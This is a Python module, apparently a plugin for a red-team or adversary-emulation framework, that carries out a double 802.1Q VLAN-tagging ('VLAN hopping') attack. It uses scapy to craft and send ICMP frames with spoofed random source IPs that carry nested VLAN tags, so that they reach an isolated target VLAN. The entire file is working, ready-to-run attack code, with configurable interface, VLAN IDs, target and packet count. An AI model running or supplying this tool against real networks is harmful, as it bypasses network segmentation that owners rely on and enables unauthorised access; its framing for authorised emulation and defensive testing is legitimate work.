"""
Double VLAN Tagging (VLAN Hopping) — T1599

Injects Ethernet frames with two 802.1Q VLAN tags. The first switch strips the
outer tag (native VLAN) and forwards the frame into the inner VLAN — bypassing
VLAN isolation without needing a trunk port. Requires attacker on native VLAN.
"""
import random

from scapy.all import Dot1Q, Ether, ICMP, IP, RandIP, sendp

NAME = "dvlan"
DESCRIPTION = "Double 802.1Q tagging to hop into an isolated VLAN"
ATTCK_ID = "T1599"


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    outer = args.outer_vlan or random.randint(1, 4094)
    inner = args.inner_vlan or random.randint(1, 4094)
    logger.info(
        "START | technique=%s | iface=%s | outer_vlan=%d | inner_vlan=%d | target=%s",
        ATTCK_ID, args.interface, outer, inner, args.target_ip,
    )
    ok = _execute(args, logger, outer, inner)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True)
    p.add_argument("--outer-vlan", type=int, help="Outer VLAN ID (native VLAN of attacker port)")
    p.add_argument("--inner-vlan", type=int, help="Inner VLAN ID (target VLAN to hop into)")
    p.add_argument("--target-ip",  "-ti", default="192.168.1.1")
    p.add_argument("--target-mac", "-tm", default="ff:ff:ff:ff:ff:ff")
    p.add_argument("--count", "-c", type=int, default=100, help="Packet count (default 100)")
    p.add_argument("--verbose", "-v", action="store_true")


# ── Core logic ────────────────────────────────────────────────────────────────

def _execute(args, logger=None, outer_vlan=None, inner_vlan=None):
    _log = logger.info if logger else print
    outer = outer_vlan or args.outer_vlan or random.randint(1, 4094)
    inner = inner_vlan or args.inner_vlan or random.randint(1, 4094)

    _log(f"[DVLAN] Outer={outer} | Inner={inner} | Target={args.target_ip}")
    pkts = _gen_packets(outer, inner, args.target_mac, args.target_ip, args.count)
    try:
        sendp(pkts, iface=args.interface, verbose=args.verbose)
        _log(f"[DVLAN] Sent {len(pkts)} double-tagged packets")
        return True
    except Exception as e:
        _log(f"[DVLAN] Error: {e}")
        return False


def _gen_packets(outer_vlan, inner_vlan, target_mac, target_ip, count):
    return [
        Ether(dst=target_mac) /
        Dot1Q(vlan=outer_vlan) /
        Dot1Q(vlan=inner_vlan) /
        IP(dst=target_ip, src=RandIP()) /
        ICMP() /
        f"DVLAN outer={outer_vlan} inner={inner_vlan}".encode()
        for _ in range(count)
    ]
